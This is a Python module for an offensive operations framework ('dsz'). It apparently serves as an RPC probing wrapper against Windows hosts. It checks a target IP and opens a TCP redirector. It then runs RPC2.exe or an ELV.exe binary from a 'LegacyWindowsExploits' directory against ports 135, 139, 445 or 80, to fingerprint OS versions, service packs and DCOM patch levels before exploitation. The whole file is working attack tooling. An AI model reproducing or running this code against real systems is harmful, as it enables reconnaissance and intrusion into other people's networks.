
import sys
import dsz.lp, dsz.cmd
import random
scans = ['1', '2', '3', '5', '7', '8', '9', '10', '13', '14', '15']
scanports = [{'port': '135', 'protocol': 'rpc_tcp', 'num': '1'}, {'port': '139', 'protocol': 'rpc_nbt', 'num': '2'}, {'port': '445', 'protocol': 'rpc_smb', 'num': '3'}, {'port': '80', 'protocol': 'rpc_http', 'num': '6'}]

def __main__(arguments):
    if (len(arguments) != 3):
        dsz.ui.Echo('Usage: rpc <target> <type> <port>', dsz.ERROR)
        printhelp(arguments)
        return 0
    resdir = dsz.lp.GetResourcesDirectory()
    target = arguments[0]
    type = arguments[1]
    port = arguments[2]
    ourscan = None
    if (not (type in scans)):
        dsz.ui.Echo('You must enter a valid scan type', dsz.ERROR)
        printhelp(arguments)
        return 0
    for thisport in scanports:
        if (port == thisport['port']):
            ourscan = thisport
    if (ourscan is None):
        dsz.ui.Echo('You must enter a valid port', dsz.ERROR)
        printhelp(arguments)
        return 0
    if (not checkip(target)):
        dsz.ui.Echo('You must enter a valid IP address', dsz.ERROR)
        return 0
    if ((type == '15') and (not ((port == '139') or (port == '445')))):
        dsz.ui.Echo('You must use port 139 or 445 with ELV touch', dsz.ERROR)
        return 0
    redircmdid = 0
    redirport = 65500
    while (redircmdid == 0):
        redirport = random.randint(10000, 65500)
        redircmdid = startredir(redirport, target, ourscan['port'])
    dsz.ui.Echo(('RPCTOUCH (type %s, %s) on %s' % (type, port, target)))
    if (type == '15'):
        PATH_TO_ELV = ('%s\\LegacyWindowsExploits\\Exploits\\ELV 2.1.3\\ELV.exe' % resdir)
        cmd = ('log local run -command "%s -i 127.0.0.1 -p %s -r 2 -t 1 -b %s -o 60 -rpc -h %s" -redirect scan_%s-%s-%s' % (PATH_TO_ELV, redirport, ourscan['num'], target, target, type, ourscan['protocol']))
        (scansucc, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        if (not scansucc):
            dsz.ui.Echo('ELV failed', dsz.ERROR)
    else:
        PATH_TO_RPC = ('%s\\Ops\\Tools\\RPC2.exe' % resdir)
        cmd = ('log local run -command "%s -i 127.0.0.1 -p %s -r %s -t 1 -b %s" -redirect scan_%s-%s-%s' % (PATH_TO_RPC, redirport, type, ourscan['num'], target, type, ourscan['protocol']))
        (scansucc, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        if (not scansucc):
            dsz.ui.Echo('RPC2 failed', dsz.ERROR)
    stopredir(redircmdid)

def stopredir(redircmdid):
    cmd = ('stop %s' % redircmdid)
    dsz.control.echo.Off()
    (succ, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not succ):
        dsz.ui.Echo(('Unable to stop redirector with cmdid %s' % redircmdid), dsz.ERROR)
        return False
    return True

def startredir(redirport, target, port):
    dsz.control.echo.Off()
    cmd = ('redirect -tcp -lplisten %s -target %s %s' % (redirport, target, port))
    dsz.control.echo.On()
    (succ, redircmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    if (not succ):
        dsz.ui.Echo(('Failed: redirect -tcp -lplisten %s -target %s %s' % (redirport, target, port)), dsz.ERROR)
        return 0
    return redircmdid

def printhelp(args):
    dsz.ui.Echo('Usage: rpc <IP to scan> [probeType] [portTypes]')
    dsz.ui.Echo(' probeType: \n\t1=General\n\t2=RegProbe\n\t3=XP Home/Pro\n\t4=Atsvc port req.\n\t5=W2K SP4 Atsvc\n\t7=probe for DCOM patches\n\t8=W2K3\n\t9=MGMT Probe\n\t10=EPMP Probe\n\t13=W2K3 SP0\n\t14=64-BIT\n\t15=ELV probe')
    dsz.ui.Echo(' portTypes: 135, 139, 445, 80')
    dsz.ui.Echo((' You provided %s arguments' % len(args)))

def checkip(ipstring):
    try:
        ipsplit = ipstring.split('.')
        if (len(ipsplit) != 4):
            return False
        for oct in ipsplit:
            if ((int(oct) > 255) or (int(oct) < 0)):
                return False
    except:
        return False
    return True
if (__name__ == '__main__'):
    try:
        __main__(sys.argv[1:])
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)